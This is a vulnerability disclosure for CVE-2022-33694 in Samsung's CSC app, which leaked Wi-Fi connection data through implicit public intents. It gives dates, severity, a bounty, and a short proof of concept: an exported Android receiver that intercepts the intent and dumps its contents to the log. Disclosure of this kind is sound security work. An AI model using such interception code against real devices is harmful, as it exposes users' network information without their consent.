# Details

<table>
    <tr>
        <td>Name</td>
        <td>CSC</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.sec.android.application.csc</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.25</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.08.03</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-33694">CVE-2022-33694</a> (SVE-2022-0737)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$2610</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/014.%20CSC%20—%20Disclosure%20of%20Wi-Fi%20connection%20info/Oversecured_report.png)

The app used implicit and public intents to transmit Wi-Fi connection data. Non-privileged apps were able to capture these intents without permissions to access network information.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<receiver android:name=".MyReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.samsung.sec.android.application.csc.chameleon_wifi" />
    </intent-filter>
</receiver>
```

File `MyReceiver.java`:
```java
public class MyReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent i) {
        DumpUtils.dump(i, context.getClassLoader());
    }
}
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)
